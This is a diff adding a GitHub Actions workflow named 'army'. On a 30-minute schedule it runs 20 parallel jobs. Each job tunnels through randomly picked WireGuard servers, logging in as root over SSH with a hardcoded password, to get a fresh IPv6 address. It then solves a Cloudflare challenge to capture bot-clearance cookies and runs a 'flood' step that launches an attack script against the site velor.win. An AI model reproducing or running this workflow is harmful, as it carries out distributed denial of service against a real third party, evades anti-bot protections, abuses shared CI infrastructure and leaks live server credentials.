@@ -1,0 +1,75 @@
+name: army
+on:
+  workflow_dispatch:
+    inputs:
+      seconds:
+        default: '1200'
+      workers:
+        default: '4'
+      mode:
+        default: 'track500'
+  schedule:
+    - cron: '*/30 * * * *'
+jobs:
+  r:
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    steps:
+      - uses: actions/checkout@v4
+      - name: deps
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq wireguard sshpass xvfb curl >/dev/null
+          npm i puppeteer-core --no-save --no-audit --no-fund >/dev/null 2>&1 || true
+      - name: tunnel via our box
+        run: |
+          BOXES="23.155.44.222|2602:f41c:0:1ad::|E2CgJqyimgW1fe+m3Evly5Ngc6UgdolbwS6R2P/Mr2w=,23.155.44.223|2602:f41c:0:1ae::|qXKN/u/SASk4Bi8a9IfmLOL472luSxwrnSCLPY2Hb3w=,23.155.44.224|2602:f41c:0:1af::|PGJu3Xn+Vd7w60bARTYVrhqEQederfz9FI+ZuGoJPU8=,23.155.44.225|2602:f41c:0:1b0::|H/59zrc3Yhy+ftUzBiFrHSANoVajvENH5StfiBC3YVg=,23.155.44.226|2602:f41c:0:1b1::|wFhWq14IE6QU3PxJhYOSqKvGHi/dqo3CZ6Hm/h2gHTA=,23.155.44.227|2602:f41c:0:1b2::|uFPLYsQ5pb05k70gkfDLCVCczwTuexgSGf2n77Ti/VU="
+          PICK=$(echo "$BOXES" | tr ',' '\n' | shuf -n 1)
+          IFS='|' read -r BOX PFX SPUB <<< "$PICK"
+          PRIV=$(wg genkey); PUB=$(echo "$PRIV" | wg pubkey)
+          SUF=$((3000 + RANDOM % 3000))
+          ADDR=${PFX}${SUF}
+          sshpass -p 'Mklpoi1234!' ssh -o StrictHostKeyChecking=no root@$BOX "wg set wg0 peer $PUB allowed-ips $ADDR/128; ip -6 route replace $ADDR/128 dev wg0; sysctl -w net.ipv6.conf.all.proxy_ndp=1 >/dev/null; ip -6 neigh replace proxy $ADDR dev enp2s18; echo REGISTERED"
+          sudo tee /etc/wireguard/bt.conf > /dev/null <<EOF
+          [Interface]
+          PrivateKey = $PRIV
+          Address = $ADDR/128
+          MTU = 1380
+          [Peer]
+          PublicKey = $SPUB
+          Endpoint = $BOX:51820
+          AllowedIPs = ::/0
+          PersistentKeepalive = 25
+          EOF
+          sudo wg-quick up bt
+          echo "ADDR=$ADDR" >> $GITHUB_ENV
+          echo "egress: $(curl -s6 --max-time 8 https://www.cloudflare.com/cdn-cgi/trace | grep -E '^ip=' || echo none)"
+          echo "velor-pre: $(curl -s6 -o /dev/null -w "%{http_code}" --max-time 8 https://velor.win/api/health)"
+      - name: solve challenge
+        env:
+          LOCAL_IP: ${{ env.ADDR }}
+        run: |
+          mkdir -p ck && cd ck
+          SOLVE_FAM=v6 SOLVE_PORT=9333 timeout 170 xvfb-run -a node ../solve.js || true
+          CK=$(cat cf_cookie.txt 2>/dev/null); UA=$(cat cf_ua.txt 2>/dev/null)
+          echo "cklen=${#CK}"
+          chk=$(curl -6 --interface $LOCAL_IP -o /dev/null -w "%{http_code}" -A "$UA" -b "$CK" --max-time 8 https://velor.win/api/health)
+          echo "cookie-check=$chk"
+          echo "CF_COOKIE=$CK" >> $GITHUB_ENV
+          echo "CF_UA=$UA" >> $GITHUB_ENV
+      - name: flood
+        env:
+          TARGET_HOST: velor.win
+          LOCAL_IP: ${{ env.ADDR }}
+          CF_COOKIE: ${{ env.CF_COOKIE }}
+          CF_UA: ${{ env.CF_UA }}
+          PACE_MS: '600'
+          ATK_OUT: atk.out
+        run: |
+          echo "flood mode=${{ inputs.mode || 'track500' }} from $LOCAL_IP"
+          node velor_atk.js ${{ inputs.mode || 'track500' }} ${{ inputs.workers || '4' }} ${{ inputs.seconds || '1200' }} 2>&1 | tail -6 || true
+          echo "== tail =="; tail -4 atk.out 2>/dev/null || true
